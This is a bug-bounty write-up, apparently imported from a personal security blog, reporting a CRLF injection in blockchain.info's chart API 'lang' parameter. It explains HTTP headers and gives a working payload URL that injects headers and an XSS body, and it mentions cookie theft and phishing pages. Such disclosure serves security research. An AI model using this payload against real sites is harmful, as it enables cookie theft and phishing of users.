---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2017-11-05_crlf-injection-in-blockchaininfo.md
original_filename: 2017-11-05_crlf-injection-in-blockchaininfo.md
title: CRLF injection in blockchain.info
category: documents
detected_topics:
- xss
- cors
- command-injection
- otp
tags:
- imported
- documents
- xss
- cors
- command-injection
- otp
language: en
raw_sha256: cbfed1520925a38ea819ade6da3d4cb6ecf695bd8bafd7bf0a9ff8dc1b70f535
text_sha256: b2636a86d738f54d6c8b83d6df4bbf95726f42cf13a4efca4770fba9da0ff34b
ingested_at: '2026-06-28T07:31:56Z'
sensitivity: unknown
redactions_applied: true
---

# CRLF injection in blockchain.info

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2017-11-05_crlf-injection-in-blockchaininfo.md
- Source Type: markdown
- Detected Topics: xss, cors, command-injection, otp
- Ingested At: 2026-06-28T07:31:56Z
- Redactions Applied: True
- Raw SHA256: `cbfed1520925a38ea819ade6da3d4cb6ecf695bd8bafd7bf0a9ff8dc1b70f535`
- Text SHA256: `b2636a86d738f54d6c8b83d6df4bbf95726f42cf13a4efca4770fba9da0ff34b`


## Content

---
title: "CRLF injection in blockchain.info"
page_title: "Shashank's Security Blog: CRLF injection in blockchain.info"
url: "http://blog.shashank.co/2017/11/crlf-injection-in-bockchaininfo.html"
final_url: "https://blog.shashank.co/2017/11/crlf-injection-in-bockchaininfo.html"
authors: ["Shashank (@cyberboyIndia)"]
programs: ["Blockchain.info"]
bugs: ["CRLF injection"]
bounty: "1,600"
publication_date: "2017-11-05"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 6063
---

This bug was reported by me to "Blockchain.info" for their bug-bounty program.  
  
For those who don't know about [blockchain.info](https://blockchain.info/)  
  
"Blockchain.info is one of the world's most popular Bitcoin wallet and provides detailed information and charts on all Bitcoin transactions and blocks."  
  
**Understanding CRLF injection**  
**  
**CRLF is CR(Carriage Return) and LF (Lined Feed or New Line) which is a non-printable ASCII character CR (ASCII value 13 also \r) and LF (ASCII value 10 also \n)  
  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhhGPyWQKVAXTSQjOxDcx8RFkTeJjddUFkbgMrGiy3d_Vfvh_tzQZtImAAE2S9widdtaNURos1THJA0Sa4yhlBbIW9oMjVbgMzwb73U73Cesn12ZppZs1bfA3dSjhi9Z1K_3TyTO9V6ODrs/s640/Screen+Shot+2017-10-31+at+7.54.05+PM.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhhGPyWQKVAXTSQjOxDcx8RFkTeJjddUFkbgMrGiy3d_Vfvh_tzQZtImAAE2S9widdtaNURos1THJA0Sa4yhlBbIW9oMjVbgMzwb73U73Cesn12ZppZs1bfA3dSjhi9Z1K_3TyTO9V6ODrs/s1600/Screen+Shot+2017-10-31+at+7.54.05+PM.png)

  
  
  
Now let's understand how CRLF is used in HTTP requests  
  
Whenever we click on a website or just open a website or do anything, a request is generated from your browser, and a response is sent back from the server to you which in turn displays us the website.  
  
For example, when we request blog.shashank.co in our browser. An HTTP request is sent  

> http://blog.shashank.co/  
>  GET / HTTP/1.1  
>  Host: blog.shashank.co  
>  User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0  
>  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8  
>  Accept-Language: en-US,en;q=0.5  
>  Accept-Encoding: gzip, deflate  
>  Connection: keep-alive  
>  Upgrade-Insecure-Requests: 1

  
And a response is sent from the server.  
  

> HTTP/1.1 200 OK  
>  Content-Type: text/html; charset=UTF-8  
>  Expires: Tue, 31 Oct 2017 14:28:13 GMT  
>  Date: Tue, 31 Oct 2017 14:28:13 GMT  
>  Cache-Control: private, max-age=0  
>  Last-Modified: Tue, 31 Oct 2017 14:26:43 GMT  
>  ETag: W/"bf427f6283ea846b52644bb883f50252d472a65378d019392f78d16d43fe2f17"  
>  Content-Encoding: gzip  
>  X-Content-Type-Options: nosniff  
>  X-XSS-Protection: 1; mode=block  
>  Content-Length: 13871  
>  Server: GSE

> <HERE IS THE WEBSITE BODY>

  
For people who are unaware of how I dumped these headers, you can simply download the "LiveHTTPHeader" plugin for Firefox browser. Or simply open inspect element in your browser and click on the "network tabs" to view how all the requests are being sent while you are browsing through any website.  
  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhgmQuBBIXQvpsz_-DJVk4FOZX7Rz9KfCQuUEJgL2qJ5t1atoTEZvXa4m9Uw-kfhYav74jl_s_E4vXzHm8ldVL_DRKAnrqRsQDOVap77a0waxLFMzEiRcmjDf5ykMRJNUBO2eK1ZuVpMEdH/s640/Screen+Shot+2017-10-31+at+8.04.06+PM.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhgmQuBBIXQvpsz_-DJVk4FOZX7Rz9KfCQuUEJgL2qJ5t1atoTEZvXa4m9Uw-kfhYav74jl_s_E4vXzHm8ldVL_DRKAnrqRsQDOVap77a0waxLFMzEiRcmjDf5ykMRJNUBO2eK1ZuVpMEdH/s1600/Screen+Shot+2017-10-31+at+8.04.06+PM.png)

  
  
Now every line in an HTTP header is separated by a CRLF (as said it is non-printable ASCII character). So its something like this.  
  

>  
>  GET / HTTP/1.1 **[CRLF]**  
>  Host: blog.shashank.co **[CRLF]**  
>  User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0 **[CRLF]**  
>  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 **[CRLF]**  
>  Accept-Language: en-US,en;q=0.5 **[CRLF]**  
>  Accept-Encoding: gzip, deflate **[CRLF]**  
>  Connection: keep-alive **[CRLF]**  
>  Upgrade-Insecure-Requests: 1 **[CRLF]**

  

> HTTP/1.1 200 OK **[CRLF]**  
>  Content-Type: text/html; charset=UTF-8 **[CRLF]**  
>  Expires: Tue, 31 Oct 2017 14:28:13 GMT **[CRLF]**  
>  Date: Tue, 31 Oct 2017 14:28:13 GMT**[CRLF]**  
>  Cache-Control: private, max-age=0**[CRLF]**  
>  Last-Modified: Tue, 31 Oct 2017 14:26:43 GMT **[CRLF]**  
>  ETag: W/"bf427f6283ea846b52644bb883f50252d472a65378d019392f78d16d43fe2f17"  
>  Content-Encoding: gzip**[CRLF]**  
>  X-Content-Type-Options: nosniff **[CRLF]**  
>  X-XSS-Protection: 1; mode=block **[CRLF]**  
>  Content-Length: 13871 **[CRLF]**  
>  Server: GSE **[CRLF] [CRLF]**

  

> <HERE IS THE BODY>

  
**The bug**  
**  
**While I was going through the website, I found a place where I can download charts data in JSON and CSV format.  
  

> https://api2.blockchain.info/charts/total-bitcoins?cors=true&format=csv&lang=en

  
The last parameter, "lang=en." I thought of playing with it and changed it to "lang=english."  
  
I noticed that the response header had a difference  
  

> GET /charts/total-bitcoins?cors=true&format=csv&lang=**english** HTTP/1.1  
>  Host: api.blockchain.info  
>  User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0  
>  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8  
>  Accept-Language: en-US,en;q=0.5  
>  Accept-Encoding: gzip, deflate, br  
>  Connection: keep-alive  
>  Upgrade-Insecure-Requests: 1  
>  HTTP/2.0 200 OK  
>  date: Tue, 31 Oct 2017 15:47:21 GMT  
>  content-type: text/csv; charset=ascii  
>  content-length: 10953  
>  access-control-allow-origin: *  
>  cache-control: public, max-age=60  
>  content-disposition: attachment; filename="total-bitcoins.csv"  
>  content-language: **english**  
>  <removed>

  
Ok so, the "lang" parameter is being reflected in the "content-language" header. Now the next step was to check for "CRLF" injection if we can add a CRLF and create our own response headers.  
  
Now to inject a CRLF, we have to URL encode it. So the URL encode of \r\n is "%0D%0A"  
  
Upon sending a request  
  

> https://api2.blockchain.info/charts/total-bitcoins?cors=true&format=csv&lang=en%0ATEST

A new header was found in the response as TEST  
  
So there is a CRLF injection!!. Now since a request also contains response body, we can even execute javascript code (cross-site scripting) to steal cookies or frame a phishing page  
  
  
So the final payload  
  

> https://api2.blockchain.info/charts/total-bitcoins?cors=true&format=csv&lang=en%0AX-XSS-Protection:0%0AContent-Type:text/html%0AContent-Length:35%0A%0A%3Csvg%20onload%3Dalert%28document.domain%29%3E&__cf_waf_tk__=***REDACTED-SUSPECT-TOKEN***[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhpyJ9xX0ThAQ-inCTOgRdEtNkkA9vQ28O_69GThvTXSkUg_Ozbm91-JeuY-Ujt4zyf6T4euSIMRAI3kBMTsaguRYR7WGzlAxAmhtHzDEJt_qBXrLbs_UphKbz_bWr8KeRb59mDZ-bpTqs1/s640/Screen+Shot+2017-10-31+at+9.27.30+PM.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhpyJ9xX0ThAQ-inCTOgRdEtNkkA9vQ28O_69GThvTXSkUg_Ozbm91-JeuY-Ujt4zyf6T4euSIMRAI3kBMTsaguRYR7WGzlAxAmhtHzDEJt_qBXrLbs_UphKbz_bWr8KeRb59mDZ-bpTqs1/s1600/Screen+Shot+2017-10-31+at+9.27.30+PM.png)

  
Or a phishing page  
  

[  
](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhIns87VQswnsCYQk4EbhGzYHR78Wph1mouAQoympBr4RmY_Sv6cZxKzTt5XRizwRfX8VTsGAyrjhNVDwSfRuUlxZandgbjjT2qrzZHeNSwXTRVHvRNnZQJYDzKuvZzqpa0BPm6IKt5nB57/s1600/Screen+Shot+2017-10-31+at+9.38.04+PM.png)[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhIns87VQswnsCYQk4EbhGzYHR78Wph1mouAQoympBr4RmY_Sv6cZxKzTt5XRizwRfX8VTsGAyrjhNVDwSfRuUlxZandgbjjT2qrzZHeNSwXTRVHvRNnZQJYDzKuvZzqpa0BPm6IKt5nB57/s640/Screen+Shot+2017-10-31+at+9.38.04+PM.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhIns87VQswnsCYQk4EbhGzYHR78Wph1mouAQoympBr4RmY_Sv6cZxKzTt5XRizwRfX8VTsGAyrjhNVDwSfRuUlxZandgbjjT2qrzZHeNSwXTRVHvRNnZQJYDzKuvZzqpa0BPm6IKt5nB57/s1600/Screen+Shot+2017-10-31+at+9.38.04+PM.png)

  

  

  

  

  

Reward 1600$
